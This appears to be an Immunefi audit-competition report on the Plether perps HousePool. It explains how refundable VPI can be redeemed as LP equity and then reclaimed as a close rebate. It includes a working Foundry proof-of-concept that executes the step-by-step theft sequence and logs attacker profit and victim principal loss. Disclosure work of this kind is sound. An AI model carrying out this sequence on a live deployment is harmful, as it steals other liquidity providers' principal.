# \#100107 [SC-Critical] Refundable open VPI is redeemable LP equity, so an LP-trader can withdraw it and then take it back as a close rebate

**Submitted on Nov 16th 2026 at 08:24:53 UTC by @iam0x04 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100107
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A skew-increasing open pays positive VPI into HousePool cash. That cash immediately raises Junior NAV and is fully redeemable through the normal LP firewall. The same position can later recover that VPI as a skew-reducing close rebate, up to its lifetime clamp. Neither the terminal NAV nor the withdrawal reserve accounts for this refundable amount.

A controller that is both a Junior LP and the trader can therefore:

1. queue a full Junior redemption;
2. open a skew-increasing position, paying VPI `q` into the Pool;
3. let the epoch settle and redeem at a NAV that includes its share `f·q`;
4. close at the same price and receive `q` back as a rebate, net of the close fee.

The remaining LPs fund the rebate and end **below their own starting principal**, so the loss is principal, not forgone yield. In the PoC, at an unchanged price and with the release risk and Pool parameters, one cycle gives the attacker **+4,825 USDG** and costs the victim LP **7,785 USDG of principal**. After the local fixture is initialized, the attack uses only public Vault and Router calls. The control runs the same trade without the LP leg: the attacker loses 6,955 (fees) and the victim gains 1,995. The applicable impact is therefore direct theft of user funds, not theft of unclaimed yield.

## Vulnerability Details


- **Open.** Positive VPI is collected into Pool cash on a skew-increasing open ([CfdEngineSettlementSidecar.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L442-L498)). It is immediately recorded as LP revenue and is not deferred while the position remains eligible for a close rebate.
- **NAV and withdrawals.** Pool NAV and LP redemption pricing use physical cash plus the terminal price delta minus claims. By specification, anticipated VPI is excluded from terminal `K` and NAV ([ACCOUNTING_SPEC.md](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L1064), [SECURITY.md](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L868-L872)). The withdrawal snapshot reserves only trader claims (C), the maximum side-liability envelope (L), the solvency buffer (B), unassigned assets and pending claimant assets ([HousePool._buildWithdrawalSnapshot](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1727)). The just-collected VPI is therefore fully withdrawable LP equity.
- **Close.** A skew-reducing close computes a VPI rebate clamped by the position's lifetime paid VPI ([CloseAccountingLib.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L125)). It pays that rebate from Pool cash after protecting only trader claims ([CfdEnginePlanLib.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L950-L990), [CfdEngineSettlementSidecar.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L618-L624)).
- **Missing guard.** The protocol already guards the mirror case. Negative lifetime VPI (owed by the trader to the Pool) is held in a nonwithdrawable reserve that "cannot be extracted by LPs before its account obligation settles" ([ACCOUNTING_SPEC.md](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L815-L823)). Positive lifetime VPI can later become an eligible close rebate, subject to the close path, the lifetime clamp and available Pool cash, but it has no equivalent deferral or reserve. It is priced into LP shares and can be redeemed while the position still retains that rebate eligibility.

The per-trader lifetime clamp keeps any single trader account from profiting on a VPI round trip. It does not stop one controller from combining the LP payout with the trader refund.


## Impact Details

At an unchanged price, the PoC gives the attacker a net profit of 4,825.07 USDG while the remaining LP ends 7,785.26 USDG below its deposited principal. The control without LP redemption makes the attacker lose 6,955.08 USDG and the LP gain 1,994.72 USDG, isolating the loss to this accounting flaw. A second test at approximately 50% Junior ownership still yields an 885.36 USDG attacker profit and a 2,485.55 USDG victim principal loss.


## Proof of Concept

## Proof of Concept


This PoC is a local Foundry integration test that executes the project's actual Pool, Vault, Clearinghouse, Engine and Router code using synthetic accounts and the repository's mock Pyth fixture. It is not a fork test or an end-to-end reproduction against a deployed instance, and it does not rely on or demonstrate production oracle manipulation.

The owner-only calls in `setUp()` configure the generic test fixture to the release Pool parameters: 40M maximum Senior exposure and an 80% Senior-share cap. They are not part of the attack. After fixture initialization, the demonstrated sequence uses ordinary Vault and Router entry points.

Save as `packages/perps/test/perps/accounting/fees/RefundableVpiLpCapture.t.sol` and run from the repository root at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`:

```sh
git submodule update --init --recursive
forge test --root packages/perps --offline --match-contract RefundableVpiLpCaptureTest -vv
```

Key expected output: 3 passed.

```text
[PASS] test_AttackRemainsProfitableAtHalfJuniorShare()
  VPI paid into Pool on open: 16199999676
  Net rebate paid from Pool on close: 12585289838
  Attacker net (all wallet, CH and LP value): 885364301
  Victim LP net: -2485546061
[PASS] test_Control_SameTradeWithoutLpRedemption()
  VPI paid into Pool on open: 24641025344
  Net rebate paid from Pool on close: 19661573100
  Attacker net (all wallet, CH and LP value): -6955077277
  Victim LP net: 1994717727
[PASS] test_RefundableVpiCapturedByLpThenRebated()
  VPI paid into Pool on open: 24641025344
  Net rebate paid from Pool on close: 19657086418
  Attacker net (all wallet, CH and LP value): 4825074123
  Victim LP net: -7785255896
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolAsyncTestBase} from "../../shared/HousePoolTestBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";

/// @notice Local integration test using the project's actual contracts and mock Pyth fixture. Positive open VPI is
///         immediately priced into Junior NAV although the same position can take it back as a close rebate. A
///         controller that is both a Junior LP and the trader redeems its LP share of the VPI, then closes and receives
///         the VPI back. After release-parameter fixture setup, the attack uses only public Vault and Router calls.
contract RefundableVpiLpCaptureTest is HousePoolAsyncTestBase {
    address internal constant VICTIM_LP = address(0x1A12);
    address internal constant ATTACKER = address(0xA7A7);
    address internal constant KEEPER = address(0xE012);
    uint256 internal constant VICTIM_DEPOSIT = 12_500_001e6;
    uint256 internal constant PRICE = 100_000_001;

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    // Release risk parameters (script/DeployPerpsArbitrumSepolia.s.sol).
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        // Configure the generic fixture to the release PoolConfig. These owner calls are not part of the attack.
        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.maxSeniorExposureAssets = 40_000_000e6;
        config.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
    }

    function test_RefundableVpiCapturedByLpThenRebated() public {
        (int256 attackerNet, int256 victimNet) = _run(true, 18_700_000e6, 12_400_000e18);
        assertGt(attackerNet, 0, "attacker realises a cash profit at an unchanged price");
        assertLt(victimNet, 0, "remaining LP loses principal");
    }

    function test_Control_SameTradeWithoutLpRedemption() public {
        (int256 attackerNet, int256 victimNet) = _run(false, 18_700_000e6, 12_400_000e18);
        assertLt(attackerNet, 0, "without the LP leg the round trip only costs fees");
        assertGt(victimNet, 0, "without the LP leg the victim LP earns the fees");
    }

    function test_AttackRemainsProfitableAtHalfJuniorShare() public {
        (int256 attackerNet, int256 victimNet) = _run(true, 12_500_000e6, 9_000_000e18);
        assertGt(attackerNet, 0, "attack remains profitable at approximately half of Junior");
        assertLt(victimNet, 0, "remaining LP loses principal at approximately half of Junior");
    }

    function _run(
        bool redeemLpLeg,
        uint256 attackerLp,
        uint256 size
    ) internal returns (int256 attackerNet, int256 victimNet) {
        // Victim and attacker become ordinary Junior LPs through the public async path.
        uint256 victimPrincipalAssets = VICTIM_DEPOSIT - pool.rawAssets();
        uint256 victimShares = _publicJuniorDeposit(VICTIM_LP, victimPrincipalAssets);
        _publicJuniorDeposit(ATTACKER, attackerLp);
        _finishAsyncCooldown(juniorVault, ATTACKER);
        _fundTrader(ATTACKER, 2_000_000e6);
        uint256 victimStart = juniorVault.convertToAssets(victimShares);
        uint256 attackerStart = _attackerWealth();

        // 1. Queue the attacker's full LP redemption; its price is fixed only at settlement.
        uint256 shares = juniorVault.balanceOf(ATTACKER);
        uint256 redeemId;
        if (redeemLpLeg) {
            vm.prank(ATTACKER);
            redeemId = juniorVault.requestRedeem(shares, ATTACKER, ATTACKER);
        }

        // 2. Skew-increasing open: positive VPI is paid into Pool cash and counts as LP equity.
        uint256 cashBeforeOpen = pool.totalAssets();
        _publicOrder(ATTACKER, CfdTypes.Side.LONG, size, 1_000_000e6, false);
        uint256 vpiIn = pool.totalAssets() - cashBeforeOpen;
        assertGt(vpiIn, 0, "open paid positive VPI to the Pool");

        // 3. The epoch settles at the same price; the attacker's redemption includes its share of the VPI.
        if (redeemLpLeg) {
            _warpToEpoch(redeemId);
            _publicSettleLpEpoch();
            assertEq(juniorVault.maxRedeem(ATTACKER), shares, "redemption fully funded inside the LP firewall");
            vm.prank(ATTACKER);
            juniorVault.redeem(shares, ATTACKER, ATTACKER);
        }

        // 4. Skew-reducing close at the same price: the lifetime-clamped rebate returns the VPI from Pool cash.
        uint256 cashBeforeClose = pool.totalAssets();
        _publicOrder(ATTACKER, CfdTypes.Side.LONG, size, 0, true);
        uint256 rebateOut = cashBeforeClose - pool.totalAssets();

        attackerNet = int256(_attackerWealth()) - int256(attackerStart);
        uint256 victimEnd = juniorVault.convertToAssets(victimShares);
        if (redeemLpLeg) {
            // The attacker holds no LP shares any more and no position is open: the Pool backs only the victim.
            assertEq(juniorVault.balanceOf(ATTACKER), 0);
            victimEnd = pool.totalAssets();
            assertLt(victimEnd, victimPrincipalAssets, "victim ends below deposited principal");
        }
        victimNet = int256(victimEnd) - int256(victimStart);

        emit log_named_uint("VPI paid into Pool on open", vpiIn);
        emit log_named_uint("Net rebate paid from Pool on close", rebateOut);
        emit log_named_int("Attacker net (all wallet, CH and LP value)", attackerNet);
        emit log_named_int("Victim LP net", victimNet);
    }

    function _attackerWealth() internal view returns (uint256) {
        return settlementToken.balanceOf(ATTACKER) + clearinghouse.getAccountEquityAssets(ATTACKER)
            + juniorVault.convertToAssets(juniorVault.balanceOf(ATTACKER));
    }

    function _publicJuniorDeposit(address lp, uint256 amount) internal returns (uint256 shares) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), amount);
        uint256 requestId = juniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        _warpToEpoch(requestId);
        _publicSettleLpEpoch();
        uint256 assets = juniorVault.claimableDepositRequest(requestId, lp);
        vm.prank(lp);
        shares = juniorVault.claimDeposit(requestId, assets, lp, lp);
    }

    function _publicOrder(address trader, CfdTypes.Side side, uint256 size, uint256 margin, bool isClose) internal {
        vm.prank(trader);
        uint64 orderId = router.commitOrder(side, size, margin, isClose ? 0 : PRICE, isClose);
        bytes[] memory updateData = _freshUpdateData();
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, updateData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "public order executes");
    }

    function _publicSettleLpEpoch() internal {
        bytes[] memory updateData = _freshUpdateData();
        vm.prank(KEEPER);
        router.settleLpEpoch(updateData);
    }

    function _freshUpdateData() internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = vm.getBlockTimestamp();
        // Synthetic updates for the repository's local mock oracle; no production feed or endpoint is used.
        bytes32[] memory feedIds = _basePythFeedIds();
        baseMockPyth.setUniquePrice(feedIds[0], int64(int256(PRICE + 1)), 0, int32(-8), publishTime, publishTime - 1);
        baseMockPyth.setUniquePrice(feedIds[1], int64(int256(PRICE - 1)), 0, int32(-8), publishTime, publishTime - 1);
        updateData = new bytes[](1);
        updateData[0] = abi.encode(PRICE);
    }

    function _warpToEpoch(uint256 epochId) internal {
        uint256 maturity = pool.lpEpochStart(epochId);
        if (vm.getBlockTimestamp() < maturity) {
            vm.warp(maturity);
        }
    }
}
```

